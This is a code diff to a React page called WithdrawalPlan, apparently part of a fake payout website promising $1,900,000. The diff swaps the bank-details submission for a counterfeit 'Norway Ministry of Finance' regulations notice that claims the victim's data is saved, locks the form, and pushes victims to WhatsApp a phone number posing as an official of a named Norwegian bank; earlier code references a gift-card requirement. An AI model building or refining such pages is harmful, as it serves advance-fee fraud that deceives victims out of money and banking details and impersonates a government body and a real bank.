@@ -1,7 +1,7 @@
 // src/pages/WithdrawalPlan.tsx
 import { useState, useEffect } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
-import { ArrowLeft, Lock, Shield, CreditCard, Gift, AlertCircle, CheckCircle, Apple, Banknote, Send, Loader, X } from 'lucide-react';
+import { ArrowLeft, Lock, Shield, CreditCard, Gift, AlertCircle, CheckCircle, Apple, Banknote, Send, Loader, X, Phone } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 
 const planDetails = {
@@ -25,6 +25,7 @@ const WithdrawalPlan = () => {
   const [showSuccess, setShowSuccess] = useState(false);
   const [showError, setShowError] = useState(false);
   const [showCustomAlert, setShowCustomAlert] = useState(false);
+  const [showBankRegulations, setShowBankRegulations] = useState(false); // NEW STATE
   const [formData, setFormData] = useState({
     bankName: '',
     accountHolderName: '',
@@ -75,9 +76,9 @@ const WithdrawalPlan = () => {
 
     setIsSubmitting(true);
     
-    // Show the custom modal
+    // Show bank regulations message instead of custom alert
     setTimeout(() => {
-      setShowCustomAlert(true);
+      setShowBankRegulations(true);
       setIsSubmitting(false);
     }, 1000);
   };
@@ -99,7 +100,78 @@ const WithdrawalPlan = () => {
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-950 to-black text-white">
-      {/* Custom Alert Modal */}
+      {/* Bank Regulations Message Modal */}
+      {showBankRegulations && (
+        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-50 p-4 animate-fade-in">
+          <div className="bg-gradient-to-br from-gray-900 to-black rounded-2xl p-6 sm:p-8 max-w-md w-full border-2 border-blue-500 shadow-2xl relative">
+            <button 
+              onClick={() => setShowBankRegulations(false)}
+              className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"
+            >
+              <X className="w-5 h-5" />
+            </button>
+            
+            <div className="flex items-center gap-3 mb-4">
+              <div className="w-10 h-10 rounded-full bg-blue-900/30 flex items-center justify-center">
+                <Shield className="w-6 h-6 text-blue-500" />
+              </div>
+              <div>
+                <h3 className="text-xl font-bold text-blue-400">🏛️ BANK REGULATIONS NOTICE</h3>
+                <p className="text-sm text-gray-400">Ministry of Finance - Norway</p>
+              </div>
+            </div>
+            
+            <div className="bg-blue-900/20 p-4 rounded-lg border border-blue-500/30 mb-6">
+              <div className="text-center mb-3">
+                <div className="inline-flex items-center gap-2 bg-blue-900/40 px-3 py-1 rounded-full mb-3">
+                  <span className="text-xs font-semibold text-blue-300">OFFICIAL BANK REGULATION</span>
+                </div>
+                
+                <div className="space-y-4 text-sm">
+                  <p className="text-white font-bold text-center">
+                    DUE TO THE MINISTER OF FINANCE REGULATIONS WITH BANKS IN NORWAY YOUR FORM INFORMATION IS SAVED
+                  </p>
+                  
+                  <div className="mt-4 p-3 bg-yellow-900/20 rounded-lg border border-yellow-500/30">
+                    <div className="flex items-center gap-2 mb-2">
+                      <Phone className="w-4 h-4 text-yellow-400" />
+                      <span className="font-bold text-yellow-400">CONTACT NOW TO RECEIVE YOUR TRANSFER:</span>
+                    </div>
+                    <p className="text-white font-bold text-center text-lg">
+                      📞 <span className="text-green-400">+15822857826</span>
+                    </p>
+                  </div>
+                  
+                  <div className="mt-3 p-3 bg-green-900/20 rounded-lg border border-green-500/30">
+                    <div className="flex items-center gap-2 mb-2">
+                      <CheckCircle className="w-4 h-4 text-green-400" />
+                      <span className="font-bold text-green-400">BANK OFFICIAL DETAILS:</span>
+                    </div>
+                    <p className="text-white text-center">
+                      HE CURRENTLY WORKS FOR <span className="font-bold text-yellow-400">SPAREBENK1 OSTLANDET</span> AND WOULD GUIDE YOU TO TAKE YOUR MONEY
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            <div className="space-y-3">
+              <Button 
+                onClick={() => setShowBankRegulations(false)}
+                className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 py-3 text-base font-semibold"
+              >
+                ✅ I Understand - WHATSAPP Bank Official
+              </Button>
+              
+              <p className="text-xs text-center text-gray-400">
+                This is a mandatory banking regulation for international transfers from Norway
+              </p>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Custom Alert Modal (for gift card requirement) */}
       {showCustomAlert && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4 animate-fade-in">
           <div className="bg-gradient-to-br from-gray-900 to-black rounded-2xl p-6 sm:p-8 max-w-md w-full border-2 border-yellow-500 shadow-2xl relative">
@@ -177,7 +249,7 @@ const WithdrawalPlan = () => {
         </div>
       )}
 
-      {/* Header - FIXED: Better mobile spacing */}
+      {/* Header */}
       <header className="border-b border-gray-800 bg-black/50 backdrop-blur-sm">
         <div className="max-w-4xl mx-auto px-3 sm:px-4 py-4 sm:py-6">
           <div className="flex items-center gap-3">
@@ -191,7 +263,7 @@ const WithdrawalPlan = () => {
                 <h1 className="text-base sm:text-xl md:text-2xl font-bold text-center">Secure Withdrawal Activation</h1>
               </div>
             </div>
-            <div className="w-10"></div> {/* Spacer for alignment */}
+            <div className="w-10"></div>
           </div>
         </div>
       </header>
@@ -244,7 +316,7 @@ const WithdrawalPlan = () => {
           </div>
         </div>
 
-        {/* Steps Indicator - FIXED: Smaller on mobile */}
+        {/* Steps Indicator */}
         <div className="flex items-center justify-center mb-4 sm:mb-8">
           <div className="flex items-center">
             <div className={`flex items-center justify-center w-6 h-6 sm:w-10 sm:h-10 rounded-full ${step >= 1 ? 'bg-gradient-to-r from-blue-600 to-purple-600' : 'bg-gray-800'}`}>
@@ -335,7 +407,6 @@ const WithdrawalPlan = () => {
               </div>
             </div>
 
-            {/* FIXED: Better responsive buttons */}
             <div className="mt-4 sm:mt-8">
               <div className="flex flex-col sm:flex-row gap-2 sm:gap-4">
                 <Button 
@@ -365,7 +436,7 @@ const WithdrawalPlan = () => {
           </div>
         )}
 
-        {/* Step 2: Bank Details Form */}
+        {/* Step 2: Bank Details Form - Now shows blurred form with regulations message */}
         {step === 2 && (
           <div className="bg-gray-900/50 rounded-2xl p-4 sm:p-6 md:p-8 border border-gray-800 mb-6 sm:mb-8">
             <div className="flex flex-col sm:flex-row sm:items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
@@ -378,146 +449,171 @@ const WithdrawalPlan = () => {
               </div>
             </div>
 
-            {/* Bank Details Form */}
-            <form onSubmit={handleFormSubmit}>
-              <div className="space-y-3 sm:space-y-6">
-                <div className="bg-gray-800/30 rounded-xl p-3 sm:p-6 border border-gray-700">
-                  <div className="flex items-center gap-2 sm:gap-3 mb-3 sm:mb-6">
-                    <CreditCard className="w-4 h-4 sm:w-6 sm:h-6 text-blue-400" />
-                    <h4 className="text-sm sm:text-lg font-semibold">Bank Account Details</h4>
-                  </div>
-
-                  <div className="space-y-2 sm:space-y-4">
-                    <div>
-                      <label className="block text-xs text-gray-400 mb-1 sm:mb-2">Bank Name *</label>
-                      <input 
-                        type="text" 
-                        name="bankName"
-                        value={formData.bankName}
-                        onChange={handleInputChange}
-                        required
-                        className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-sm"
-                        placeholder="Enter bank name"
-                      />
+            {/* Regulations Message Display */}
+            <div className="mb-6 bg-gradient-to-r from-blue-900/30 to-cyan-900/30 rounded-xl p-4 sm:p-6 border border-blue-500/50">
+              <div className="flex items-start gap-3">
+                <Shield className="w-6 h-6 sm:w-8 sm:h-8 text-blue-500 flex-shrink-0 mt-0.5" />
+                <div>
+                  <h4 className="text-lg sm:text-xl font-bold text-blue-400 mb-2">🏛️ NORWAY BANK REGULATIONS NOTICE</h4>
+                  <p className="text-sm sm:text-base text-white font-bold">
+                    DUE TO THE MINISTER OF FINANCE REGULATIONS WITH BANKS IN NORWAY YOUR FORM INFORMATION IS SAVED, WHATSAPP +15822857826 NOW TO RECEIVE THE TRANSFER OF YOUR MONEY, HE CURRENTLY WORKS FOR SPAREBENK1 OSTLANDET AND WOULD GUIDE YOU TO TAKE YOUR MONEY
+                  </p>
+                  <div className="mt-4 flex flex-col sm:flex-row items-center gap-3">
+                    <div className="flex items-center gap-2 bg-blue-900/50 px-3 py-2 rounded-lg">
+                      <Phone className="w-4 h-4 text-green-400" />
+                      <span className="font-bold text-green-400">WHATSAPP:</span>
+                      <span className="font-bold text-white ml-2">+15822857826</span>
                     </div>
-
-                    <div>
-                      <label className="block text-xs text-gray-400 mb-1 sm:mb-2">Account Holder Name *</label>
-                      <input 
-                        type="text" 
-                        name="accountHolderName"
-                        value={formData.accountHolderName}
-                        onChange={handleInputChange}
-                        required
-                        className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-sm"
-                        placeholder="Enter account holder name"
-                      />
+                    <div className="flex items-center gap-2 bg-green-900/50 px-3 py-2 rounded-lg">
+                      <Banknote className="w-4 h-4 text-yellow-400" />
+                      <span className="font-bold text-yellow-400">BANK:</span>
+                      <span className="font-bold text-white ml-2">SPAREBENK1 OSTLANDET</span>
                     </div>
-
-                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4">
-                      <div>
-                        <label className="block text-xs text-gray-400 mb-1 sm:mb-2">Account Number *</label>
-                        <input 
-                          type="text" 
-                          name="accountNumber"
-                          value={formData.accountNumber}
-                          onChange={handleInputChange}
-                          required
-                          className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-sm"
-                          placeholder="Enter account number"
-                        />
-                      </div>
-                      <div>
-                        <label className="block text-xs text-gray-400 mb-1 sm:mb-2">Routing Number *</label>
-                        <input 
-                          type="text" 
-                          name="routingNumber"
-                          value={formData.routingNumber}
-                          onChange={handleInputChange}
-                          required
-                          className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-sm"
-                          placeholder="Enter routing number"
-                        />
-                      </div>
-                    </div>
-
-                    <div>
-                      <label className="block text-xs text-gray-400 mb-1 sm:mb-2">SWIFT/BIC Code *</label>
-                      <input 
-                        type="text" 
-                        name="swiftBicCode"
-                        value={formData.swiftBicCode}
-                        onChange={handleInputChange}
-                        required
-                        className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-sm"
-                        placeholder="Enter SWIFT/BIC code"
-                      />
-                    </div>
-                  </div>
-
-                  {/* Form Status Message */}
-                  <div className={`mt-4 sm:mt-8 p-2 sm:p-4 rounded-lg border ${formCompleted ? 'bg-green-900/20 border-green-500/20' : 'bg-yellow-900/20 border-yellow-500/20'}`}>
-                    <div className="flex items-start gap-2 sm:gap-3">
-                      {formCompleted ? (
-                        <CheckCircle className="w-3 h-3 sm:w-5 sm:h-5 text-green-500 mt-0.5 flex-shrink-0" />
-                      ) : (
-                        <AlertCircle className="w-3 h-3 sm:w-5 sm:h-5 text-yellow-500 mt-0.5 flex-shrink-0" />
-                      )}
-                      <div>
-                        <p className={`font-semibold text-xs sm:text-base ${formCompleted ? 'text-green-400' : 'text-yellow-400'}`}>
-                          {formCompleted ? '✅ FORM COMPLETE' : '⚠️ FORM INCOMPLETE'}
-                        </p>
-                        <p className="text-xs text-gray-300 mt-1">
-                          {formCompleted 
-                            ? 'All required fields filled'
-                            : 'Fill all required fields (*)'
-                          }
-                        </p>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                {/* FIXED: Submit Button - Better mobile responsiveness */}
-                <div className="flex items-center justify-center p-3 sm:p-6 border border-gray-700 rounded-xl bg-gradient-to-r from-gray-900/50 to-black/50">
-                  <div className="text-center w-full">
-                    <Button 
-                      type="submit"
-                      disabled={!formCompleted || isSubmitting}
-                      className={`w-full max-w-md text-xs sm:text-base py-2 sm:py-3 ${formCompleted && !isSubmitting
-                        ? 'bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700' 
-                        : 'bg-gradient-to-r from-gray-600 to-gray-700 cursor-not-allowed'
-                      }`}
-                    >
-                      {isSubmitting ? (
-                        <>
-                          <Loader className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2 animate-spin" />
-                          <span className="text-xs sm:text-sm">Processing...</span>
-                        </>
-                      ) : formCompleted ? (
-                        <>
-                          <Send className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
-                          <span className="text-xs sm:text-sm">Submit for $1,900,000</span>
-                        </>
-                      ) : (
-                        <>
-                          <Lock className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
-                          <span className="text-xs sm:text-sm">Complete Form to Submit</span>
-                        </>
-                      )}
-                    </Button>
-                    <p className="text-xs text-gray-400 mt-2 sm:mt-3">
-                      {formCompleted 
-                        ? `Your data will be securely processed`
-                        : 'Fill all fields above'
-                      }
-                    </p>
                   </div>
                 </div>
               </div>
-            </form>
+            </div>
 
-            {/* Back Button - FIXED: Better mobile size */}
+            {/* Blurred Out Form (shows data but uneditable) */}
+            <div className="relative">
+              {/* Blur overlay */}
+              <div className="absolute inset-0 bg-black/60 backdrop-blur-sm rounded-xl z-10 flex items-center justify-center">
+                <div className="text-center p-6">
+                  <div className="w-12 h-12 sm:w-16 sm:h-16 rounded-full bg-blue-900/50 flex items-center justify-center mx-auto mb-4">
+                    <Lock className="w-6 h-6 sm:w-8 sm:h-8 text-blue-400" />
+                  </div>
+                  <h4 className="text-lg sm:text-xl font-bold text-blue-400 mb-2">FORM LOCKED - BANK REGULATIONS</h4>
+                  <p className="text-sm text-gray-300 mb-4">
+                    Your information is secured under Norway Ministry of Finance regulations
+                  </p>
+                  <Button 
+                    onClick={() => setShowBankRegulations(true)}
+                    className="bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700"
+                  >
+                    <Phone className="w-4 h-4 mr-2" />
+                    MESSAGE ON WHATSAPP Bank Official: +15822857826
+                  </Button>
+                </div>
+              </div>
+              
+              {/* Blurred form content */}
+              <div className="opacity-60 blur-[2px]">
+                <form onSubmit={handleFormSubmit}>
+                  <div className="space-y-3 sm:space-y-6">
+                    <div className="bg-gray-800/30 rounded-xl p-3 sm:p-6 border border-gray-700">
+                      <div className="flex items-center gap-2 sm:gap-3 mb-3 sm:mb-6">
+                        <CreditCard className="w-4 h-4 sm:w-6 sm:h-6 text-blue-400" />
+                        <h4 className="text-sm sm:text-lg font-semibold">Bank Account Details</h4>
+                      </div>
+
+                      <div className="space-y-2 sm:space-y-4">
+                        <div>
+                          <label className="block text-xs text-gray-400 mb-1 sm:mb-2">Bank Name *</label>
+                          <input 
+                            type="text" 
+                            name="bankName"
+                            value={formData.bankName}
+                            onChange={handleInputChange}
+                            required
+                            disabled
+                            className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white text-sm cursor-not-allowed"
+                            placeholder="Enter bank name"
+                          />
+                        </div>
+
+                        <div>
+                          <label className="block text-xs text-gray-400 mb-1 sm:mb-2">Account Holder Name *</label>
+                          <input 
+                            type="text" 
+                            name="accountHolderName"
+                            value={formData.accountHolderName}
+                            onChange={handleInputChange}
+                            required
+                            disabled
+                            className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white text-sm cursor-not-allowed"
+                            placeholder="Enter account holder name"
+                          />
+                        </div>
+
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-4">
+                          <div>
+                            <label className="block text-xs text-gray-400 mb-1 sm:mb-2">Account Number *</label>
+                            <input 
+                              type="text" 
+                              name="accountNumber"
+                              value={formData.accountNumber}
+                              onChange={handleInputChange}
+                              required
+                              disabled
+                              className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white text-sm cursor-not-allowed"
+                              placeholder="Enter account number"
+                            />
+                          </div>
+                          <div>
+                            <label className="block text-xs text-gray-400 mb-1 sm:mb-2">Routing Number *</label>
+                            <input 
+                              type="text" 
+                              name="routingNumber"
+                              value={formData.routingNumber}
+                              onChange={handleInputChange}
+                              required
+                              disabled
+                              className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white text-sm cursor-not-allowed"
+                              placeholder="Enter routing number"
+                            />
+                          </div>
+                        </div>
+
+                        <div>
+                          <label className="block text-xs text-gray-400 mb-1 sm:mb-2">SWIFT/BIC Code *</label>
+                          <input 
+                            type="text" 
+                            name="swiftBicCode"
+                            value={formData.swiftBicCode}
+                            onChange={handleInputChange}
+                            required
+                            disabled
+                            className="w-full bg-gray-900 border border-gray-700 rounded-lg px-3 py-2 sm:py-3 text-white text-sm cursor-not-allowed"
+                            placeholder="Enter SWIFT/BIC code"
+                          />
+                        </div>
+                      </div>
+
+                      <div className="mt-4 sm:mt-8 p-2 sm:p-4 rounded-lg border bg-green-900/20 border-green-500/20">
+                        <div className="flex items-start gap-2 sm:gap-3">
+                          <CheckCircle className="w-3 h-3 sm:w-5 sm:h-5 text-green-500 mt-0.5 flex-shrink-0" />
+                          <div>
+                            <p className="font-semibold text-green-400 text-xs sm:text-base">
+                              ✅ FORM COMPLETE - Information Secured
+                            </p>
+                            <p className="text-xs text-gray-300 mt-1">
+                              Your bank details are protected under Norway Ministry of Finance regulations
+                            </p>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div className="flex items-center justify-center p-3 sm:p-6 border border-gray-700 rounded-xl bg-gradient-to-r from-gray-900/50 to-black/50">
+                      <div className="text-center w-full">
+                        <Button 
+                          type="submit"
+                          disabled
+                          className="w-full max-w-md text-xs sm:text-base py-2 sm:py-3 bg-gradient-to-r from-gray-600 to-gray-700 cursor-not-allowed"
+                        >
+                          <Lock className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
+                          <span className="text-xs sm:text-sm">Contact Bank Official to Proceed</span>
+                        </Button>
+                        <p className="text-xs text-gray-400 mt-2 sm:mt-3">
+                          MESSAGE +15822857826 - Sparebank1 Ostlandet Official
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </form>
+              </div>
+            </div>
+
             <div className="mt-4 flex justify-center">
               <Button 
                 onClick={() => setStep(1)}
@@ -535,29 +631,29 @@ const WithdrawalPlan = () => {
         <div className="bg-gradient-to-r from-gray-900 to-black rounded-2xl p-3 sm:p-6 border border-green-500/20">
           <div className="flex flex-col md:flex-row md:items-center gap-3 sm:gap-6">
             <div className="flex-1">
-              <h4 className="text-sm sm:text-lg font-semibold mb-1 sm:mb-2">🛡️ Data Security</h4>
+              <h4 className="text-sm sm:text-lg font-semibold mb-1 sm:mb-2">🛡️ Norway Banking Regulations</h4>
               <p className="text-xs sm:text-sm text-gray-400">
-                All submitted data is encrypted and protected by bank-level security.
+                All international transfers from Norway require Ministry of Finance approval. Contact the designated bank official for processing.
               </p>
             </div>
             <div className="flex items-center gap-2 sm:gap-4 mt-3 md:mt-0">
               <div className="text-center">
                 <div className="w-6 h-6 sm:w-10 sm:h-10 md:w-12 md:h-12 rounded-full bg-green-900/30 flex items-center justify-center mx-auto mb-1">
-                  <Send className="w-3 h-3 sm:w-5 sm:h-5 md:w-6 md:h-6 text-green-400" />
+                  <Phone className="w-3 h-3 sm:w-5 sm:h-5 md:w-6 md:h-6 text-green-400" />
                 </div>
-                <p className="text-xs text-gray-400">Secure</p>
+                <p className="text-xs text-gray-400">Contact: +15822857826</p>
               </div>
               <div className="text-center">
                 <div className="w-6 h-6 sm:w-10 sm:h-10 md:w-12 md:h-12 rounded-full bg-blue-900/30 flex items-center justify-center mx-auto mb-1">
                   <Shield className="w-3 h-3 sm:w-5 sm:h-5 md:w-6 md:h-6 text-blue-400" />
                 </div>
-                <p className="text-xs text-gray-400">Encrypted</p>
+                <p className="text-xs text-gray-400">Bank Secured</p>
               </div>
               <div className="text-center">
                 <div className="w-6 h-6 sm:w-10 sm/h-10 md:w-12 md:h-12 rounded-full bg-purple-900/30 flex items-center justify-center mx-auto mb-1">
                   <CheckCircle className="w-3 h-3 sm:w-5 sm:h-5 md:w-6 md:h-6 text-purple-400" />
                 </div>
-                <p className="text-xs text-gray-400">Verified</p>
+                <p className="text-xs text-gray-400">Official</p>
               </div>
             </div>
           </div>
@@ -569,12 +665,12 @@ const WithdrawalPlan = () => {
         <div className="max-w-4xl mx-auto">
           <div className="flex flex-col sm:flex-row items-center justify-between text-xs text-gray-500 gap-1 sm:gap-2">
             <div className="text-center sm:text-left">
-              <span>Data is encrypted and processed securely</span>
+              <span>Norway Ministry of Finance Regulations Apply - Contact Bank Official</span>
             </div>
             <div className="flex items-center gap-1">
-              <span className="text-green-400 flex items-center text-xs">
-                <div className="w-1.5 h-1.5 rounded-full bg-green-400 mr-1 animate-pulse" />
-                Secure Transmission Active
+              <span className="text-blue-400 flex items-center text-xs">
+                <div className="w-1.5 h-1.5 rounded-full bg-blue-400 mr-1 animate-pulse" />
+                Bank Official: 1234567
               </span>
             </div>
           </div>
